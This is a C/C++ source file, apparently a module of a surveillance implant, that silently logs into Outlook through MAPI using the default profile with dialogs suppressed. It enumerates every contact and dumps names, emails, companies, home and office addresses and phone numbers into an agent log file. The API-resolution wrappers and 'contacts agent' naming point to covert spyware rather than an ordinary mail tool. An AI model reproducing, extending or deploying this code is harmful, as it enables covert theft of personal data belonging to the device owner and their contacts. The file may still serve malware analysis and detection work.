#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mapix.h>
#include "OLABMAPI.h"
#include "../common.h"
#include "../LOG.h"
#include "../HM_SafeProcedures.h"

#define CHECK_FUNC(x) if (!(x)) { return FALSE; }
#define RELEASE(s) if(s!=NULL) { s->Release();s=NULL; }
#define MAPI_CACHE_ONLY 0x00004000

// GLOBAL VARIABLES
// Funzioni di mapi32.dll
static MAPIINITIALIZE *pMAPIInitialize;
static MAPILOGONEX *pMAPILogonEx;
static MAPIUNINITIALIZE *pMAPIUninitialize;
static MAPIFREEBUFFER *pMAPIFreeBuffer;
#define MAPI_NOT_LOADED 0
#define MAPI_LOADED		1
#define MAPI_CANT_LOAD	2
static int mapi_status = MAPI_NOT_LOADED;

extern BOOL g_bContactsForceExit;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)

enum { OUTLOOK_DATA1=0x00062004, OUTLOOK_EMAIL1=0x8083, OUTLOOK_EMAIL2=0x8093, OUTLOOK_EMAIL3=0x80A3,
		OUTLOOK_IM_ADDRESS=0x8062, OUTLOOK_FILE_AS=0x8005, OUTLOOK_POSTAL_ADDRESS=0x8022, OUTLOOK_DISPLAY_ADDRESS_HOME=0x801A,
		OUTLOOK_PICTURE_FLAG=0x8015, OUTLOOK_CATEGORIES=0xF101E };

static BOOL OL_LoadMapi()
{
	HMODULE hmapilib = LoadLibrary("mapi32.dll"); 
	if (!hmapilib) 
		return FALSE;

	CHECK_FUNC(pMAPIInitialize = (MAPIINITIALIZE*)HM_SafeGetProcAddress(hmapilib, "MAPIInitialize"));
	CHECK_FUNC(pMAPILogonEx = (MAPILOGONEX*)HM_SafeGetProcAddress(hmapilib,"MAPILogonEx"));
	CHECK_FUNC(pMAPIUninitialize = (MAPIUNINITIALIZE*)HM_SafeGetProcAddress(hmapilib,"MAPIUninitialize"));
	CHECK_FUNC(pMAPIFreeBuffer = (MAPIFREEBUFFER*)HM_SafeGetProcAddress(hmapilib,"MAPIFreeBuffer"));

	return TRUE;
}

static void OL_FreeProws(SRowSet *r)
{ 
	if (!r) 
		return;
	for (unsigned int i=0; i<r->cRows; i++) { 
		SPropValue *pv = r->aRow[i].lpProps;
		pMAPIFreeBuffer(pv);
	}
	pMAPIFreeBuffer(r);
}

LPMDB OL_GetDefMessageStore(IMAPITable *pMsgStoresTable, IMAPISession* mapi_session)
{
	LPSRowSet pRows = NULL;
	LPMDB pMsgStore = NULL;

	if (!pMsgStoresTable)
		return NULL;

	while(pMsgStoresTable->QueryRows(1, 0, &pRows) == S_OK) {
		if (pRows->cRows == 0) {
			OL_FreeProws(pRows);
			return NULL;
		}

		if(!pRows->aRow[0].lpProps[2].Value.b) {
			OL_FreeProws(pRows);
			continue;
		}

		// Se non riesce ad aprirlo continua...
		if (mapi_session->OpenMsgStore(NULL, pRows->aRow[0].lpProps[1].Value.bin.cb, (ENTRYID*)pRows->aRow[0].lpProps[1].Value.bin.lpb, NULL, MDB_NO_DIALOG | MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &pMsgStore) == S_OK) {
			OL_FreeProws(pRows);
			return pMsgStore;
		}
		OL_FreeProws(pRows);
	}

	return NULL;
}

static IMAPITable *OL_OpenMessageStores(IMAPISession* mapi_session)
{
	const int nProperties = 3;
	IMAPITable *pMsgStoresTable;

	if(!mapi_session) 
		return NULL;

	if(mapi_session->GetMsgStoresTable(0, &pMsgStoresTable) != S_OK) 
		return NULL;

	SizedSPropTagArray(nProperties,Columns)={nProperties,{PR_DISPLAY_NAME_W, PR_ENTRYID, PR_DEFAULT_STORE}};		
	if(pMsgStoresTable->SetColumns((LPSPropTagArray)&Columns, 0) != S_OK) {
		RELEASE(pMsgStoresTable);
		return NULL;
	}
	return pMsgStoresTable;
}

IMAPIFolder *OL_OpenInbox(LPMDB pMsgStore)
{
	ULONG cbEntryID;
	LPENTRYID pEntryID;
	DWORD dwObjType;
	IMAPIFolder *pFolder;

	if (!pMsgStore)
		return NULL;

	if (pMsgStore->GetReceiveFolder(NULL, 0, &cbEntryID, &pEntryID, NULL)!=S_OK) return NULL;
	if (pMsgStore->OpenEntry(cbEntryID, pEntryID, NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS | MDB_NO_DIALOG, &dwObjType, (LPUNKNOWN*)&pFolder) != S_OK) {
		pMAPIFreeBuffer(pEntryID);
		return NULL;
	}
	pMAPIFreeBuffer(pEntryID);
	return pFolder;
}

LPMAPITABLE OL_ABGetContents(IMAPIFolder *pFolder)
{
	LPMAPITABLE pContents;
	const int nProperties = 2;

	if (!pFolder)
		return NULL;

	if(pFolder->GetContentsTable(MAPI_UNICODE, &pContents)!= S_OK) 
		return NULL;

	SizedSPropTagArray(nProperties, Columns)={nProperties,{PR_MESSAGE_FLAGS, PR_ENTRYID }};
	if(pContents->SetColumns((LPSPropTagArray)&Columns, 0) != S_OK) {
		RELEASE(pContents);
		return NULL;
	}
	return pContents;
}

IMAPIProp *OL_GetNextContact(IMAPITable *pMsgStoresTable, IMAPISession* mapi_session)
{
	LPSRowSet pRows = NULL;
	IMAPIProp *pItem = NULL;
	ULONG ulObjType;

	if (!pMsgStoresTable)
		return NULL;

	while(pMsgStoresTable->QueryRows(1, 0, &pRows) == S_OK) {
		if (pRows->cRows == 0) {
			OL_FreeProws(pRows);
			return NULL;
		}

		// Se non riesce ad aprirlo continua...
		if (mapi_session->OpenEntry(pRows->aRow[0].lpProps[1].Value.bin.cb, (ENTRYID*)pRows->aRow[0].lpProps[1].Value.bin.lpb, NULL, MDB_NO_DIALOG | MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &ulObjType, (LPUNKNOWN*)&pItem) == S_OK) {
			OL_FreeProws(pRows);
			return pItem;
		}
		OL_FreeProws(pRows);
	}
	return NULL;
}

BOOL OL_GetPropertyString(IMAPIProp *msg_item, WCHAR *buff, DWORD buf_len, DWORD pr_id)
{
	ULONG rgTags[2] = {1,0};
	DWORD ulPropCount;
	LPSPropValue props = NULL;

	rgTags[1] = pr_id;
	if (!buff || buf_len==0)
		return FALSE;

	ZeroMemory(buff, buf_len);
	if (!msg_item)
		return FALSE;

	if (msg_item->GetProps((LPSPropTagArray)rgTags, MAPI_UNICODE, &ulPropCount, &props) == S_OK) {
		_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s", props->Value.lpszW);		
		pMAPIFreeBuffer(props);
		return TRUE;
	}
	return FALSE;
}

int GetOutlookEmailID(int nIndex)
{
	ULONG ulProperty[]={ OUTLOOK_EMAIL1, OUTLOOK_EMAIL2, OUTLOOK_EMAIL3 };
	if(nIndex<1 || nIndex>3) return 0;
	return ulProperty[nIndex-1];
}

WCHAR *ValidateString(WCHAR * s)
{
	if(s && !FNC(IsBadStringPtrW)(s, (UINT_PTR)-1)) 
		return s;
	return NULL;
}

BOOL GetOutlookPropTagArray(IMAPIProp *msg_item, ULONG ulData, ULONG ulProperty, LPSPropTagArray& lppPropTags, int& nFieldType, BOOL bCreate)
{
	const GUID guidOutlookEmail1={ulData, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
	MAPINAMEID nameID;
	HRESULT hr;

	if(!msg_item) 
		return FALSE;

	nameID.lpguid=(GUID*)&guidOutlookEmail1;
	nameID.ulKind=MNID_ID;
	nameID.Kind.lID=ulProperty;

	nFieldType=PT_UNICODE;
	LPMAPINAMEID lpNameID[1]={ &nameID };

	hr = msg_item->GetIDsFromNames(1, lpNameID, bCreate ? MAPI_CREATE : 0, &lppPropTags);
	return (hr == S_OK);
}

BOOL GetOutlookProperty(IMAPIProp *msg_item, ULONG ulData, ULONG ulProperty, LPSPropValue& pProp)
{
	LPSPropTagArray lppPropTags;
	int nFieldType;
	HRESULT hr;
	ULONG ulPropCount;

	if(!GetOutlookPropTagArray(msg_item, ulData,ulProperty, lppPropTags, nFieldType, FALSE)) 
		return FALSE;

	hr = msg_item->GetProps(lppPropTags, MAPI_UNICODE, &ulPropCount, &pProp);
	pMAPIFreeBuffer(lppPropTags);
	return (hr == S_OK);
}

BOOL OL_GetEmailAddress(IMAPIProp *msg_item, WCHAR *buff, DWORD buf_len)
{
	LPSPropValue pProp;
	BOOL is_ex = FALSE;
	WCHAR *addr_type;
	WCHAR *email;
	ULONG nID;

	if (!buff || buf_len==0)
		return FALSE;

	ZeroMemory(buff, buf_len);
	if (!msg_item)
		return FALSE;

	nID = GetOutlookEmailID(1);
	if(!nID) 
		return FALSE;

	if(GetOutlookProperty(msg_item, OUTLOOK_DATA1, nID-1, pProp)) {
		addr_type = ValidateString(pProp->Value.lpszW);
		if (addr_type && !_wcsicmp(addr_type, L"EX"))
			is_ex = TRUE;
		pMAPIFreeBuffer(pProp);

		if(GetOutlookProperty(msg_item, OUTLOOK_DATA1, nID, pProp)) {
			email = ValidateString(pProp->Value.lpszW);
			if(email)
				_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s", email);		
			pMAPIFreeBuffer(pProp);

			if(is_ex) {
				// for EX types we use the original display name (seems to contain the appropriate data)
				if(GetOutlookProperty(msg_item, OUTLOOK_DATA1, nID+1, pProp)) {
					email = ValidateString(pProp->Value.lpszW);
					if(email)
						_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s", email);		
					pMAPIFreeBuffer(pProp);
				}
			}
			return TRUE;
		}
	}
	return FALSE;
}

#define ADDR_HOME 0
#define ADDR_OFFICE 1
BOOL OL_GetAddress(IMAPIProp *msg_item, WCHAR *buff, DWORD buf_len, DWORD type) 
{
	WCHAR temp_buf[256];
	const ULONG ContactAddressTag[][5]={
	{ PR_HOME_ADDRESS_CITY_W, PR_HOME_ADDRESS_COUNTRY_W, PR_HOME_ADDRESS_STATE_OR_PROVINCE_W,
		PR_HOME_ADDRESS_STREET_W, PR_HOME_ADDRESS_POSTAL_CODE_W },
	{ PR_BUSINESS_ADDRESS_CITY_W, PR_BUSINESS_ADDRESS_COUNTRY_W, PR_BUSINESS_ADDRESS_STATE_OR_PROVINCE_W,
		PR_BUSINESS_ADDRESS_STREET_W, PR_BUSINESS_ADDRESS_POSTAL_CODE_W },
	{ PR_OTHER_ADDRESS_CITY_W, PR_OTHER_ADDRESS_COUNTRY_W, PR_OTHER_ADDRESS_STATE_OR_PROVINCE_W, 
		PR_OTHER_ADDRESS_STREET_W, PR_OTHER_ADDRESS_POSTAL_CODE_W }};

	if (!buff || buf_len==0)
		return FALSE;

	ZeroMemory(buff, buf_len);
	if (!msg_item)
		return FALSE;

	if (OL_GetPropertyString(msg_item, temp_buf, sizeof(temp_buf), ContactAddressTag[type][3]) && temp_buf[0]!=L'')
		_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s", temp_buf);
	if (OL_GetPropertyString(msg_item, temp_buf, sizeof(temp_buf), ContactAddressTag[type][0]) && temp_buf[0]!=L'')
		_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s, %s", buff, temp_buf);
	if (OL_GetPropertyString(msg_item, temp_buf, sizeof(temp_buf), ContactAddressTag[type][1]) && temp_buf[0]!=L'')
		_snwprintf_s(buff, buf_len/sizeof(WCHAR), _TRUNCATE, L"%s (%s)", buff, temp_buf);

	if (buff[0] != L'')
		return TRUE;
	return FALSE;
}

#define PR_IPM_CONTACT_ENTRYID (PROP_TAG(PT_BINARY, 0x36D1))
BOOL OL_OpenAddressBook(IMAPISession* mapi_session, HANDLE hfile)
{
	ULONG cValues = 0;
	LPSPropValue props = NULL;
	DWORD dwObjType;
	ULONG rgTags[] = { 1, PR_IPM_CONTACT_ENTRYID };
	IMAPITable *msg_store_table = NULL;
	LPMDB msg_store = NULL;
	IMAPIFolder *msg_folder = NULL;
	LPMAPITABLE msg_contents = NULL;
	IMAPIProp *msg_item = NULL;

	msg_store_table = OL_OpenMessageStores(mapi_session);
	msg_store = OL_GetDefMessageStore(msg_store_table, mapi_session);
	msg_folder = OL_OpenInbox(msg_store);

	// Prende dal default message store l'id di PR_IPM_CONTACT_ENTRYID
	if (!msg_folder || msg_folder->GetProps((LPSPropTagArray) rgTags, MAPI_UNICODE, &cValues, &props)!=S_OK) {
		RELEASE(msg_folder);
		RELEASE(msg_store);
		RELEASE(msg_store_table);
		return FALSE;
	}

	// Rilascia il default message store
	RELEASE(msg_folder);
	// Apre il folder relativo a PR_IPM_CONTACT_ENTRYID
	msg_store->OpenEntry(props[0].Value.bin.cb, (LPENTRYID)props[0].Value.bin.lpb, NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS | MDB_NO_DIALOG, &dwObjType, (LPUNKNOWN*)&msg_folder);
	pMAPIFreeBuffer(props);

	if (!msg_folder) {
		RELEASE(msg_store);
		RELEASE(msg_store_table);
		return FALSE;
	}

	msg_contents = OL_ABGetContents(msg_folder);
	
	while (!g_bContactsForceExit && (msg_item = OL_GetNextContact(msg_contents, mapi_session))) {
		WCHAR name[256];
		WCHAR email[256];
		WCHAR company[256];
		WCHAR addr_home[256];
		WCHAR addr_office[256];
		WCHAR phone_off[256];
		WCHAR phone_mob[256];
		WCHAR phone_hom[256];

		OL_GetPropertyString(msg_item, name, sizeof(name), PR_DISPLAY_NAME_W);
		OL_GetEmailAddress(msg_item, email, sizeof(email));
		OL_GetPropertyString(msg_item, company, sizeof(company), PR_COMPANY_NAME_W);
		OL_GetAddress(msg_item, addr_home, sizeof(addr_home), ADDR_HOME);
		OL_GetAddress(msg_item, addr_office, sizeof(addr_office), ADDR_OFFICE);
		OL_GetPropertyString(msg_item, phone_off, sizeof(phone_off), PR_OFFICE_TELEPHONE_NUMBER_W);
		OL_GetPropertyString(msg_item, phone_mob, sizeof(phone_mob), PR_MOBILE_TELEPHONE_NUMBER_W);
		OL_GetPropertyString(msg_item, phone_hom, sizeof(phone_hom), PR_HOME_TELEPHONE_NUMBER_W);
		
		DumpContact(hfile, CONTACT_SRC_OUTLOOK, name, email, company, addr_home, addr_office, phone_off, phone_mob, phone_hom, NULL, NULL, 0);

		RELEASE(msg_item);
	}

	RELEASE(msg_contents);
	RELEASE(msg_folder);
	RELEASE(msg_store);
	RELEASE(msg_store_table);
	return TRUE;
}

static BOOL IsOutlookInstalled()
{
	HKEY hKey;
	BYTE key_value[1024];
	DWORD key_len = sizeof(key_value);
	HMODULE hdll;

	ZeroMemory(key_value, sizeof(key_value));
	if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"Software\\Clients\\Mail\\Microsoft Outlook", 0, KEY_READ | KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) 
		return FALSE;

	if (FNC(RegQueryValueExW)(hKey, L"DLLPathEx", NULL, NULL, key_value, &key_len) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hKey);
		return FALSE;
	}

	FNC(RegCloseKey)(hKey);
	hdll = LoadLibraryW((WCHAR *)key_value);
	if (!hdll)
		return FALSE;
	FreeLibrary(hdll);

	return TRUE;
}


BOOL OL_DumpAddressBook()
{
	IMAPISession *mapi_session = NULL;
	HANDLE hfile;
	
	if (mapi_status == MAPI_NOT_LOADED) {
		if (IsOutlookInstalled() && OL_LoadMapi())
			mapi_status = MAPI_LOADED;
		else
			mapi_status = MAPI_CANT_LOAD;
	}

	if (mapi_status != MAPI_LOADED)
		return FALSE;

	if (pMAPIInitialize(NULL) != S_OK)
		return FALSE;

	if (pMAPILogonEx(NULL, NULL, NULL, MAPI_EXTENDED | MAPI_USE_DEFAULT | MAPI_NEW_SESSION, &mapi_session) != S_OK ) {
		pMAPIUninitialize();
		return FALSE;
	}
	
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
	OL_OpenAddressBook(mapi_session, hfile);
	Log_CloseFile(hfile);
	
	RELEASE(mapi_session);
	Sleep(2000); // XXX Fix ufficiale di microsoft per il LORO bug delle mapi!!!!
	pMAPIUninitialize();
	return TRUE;
}
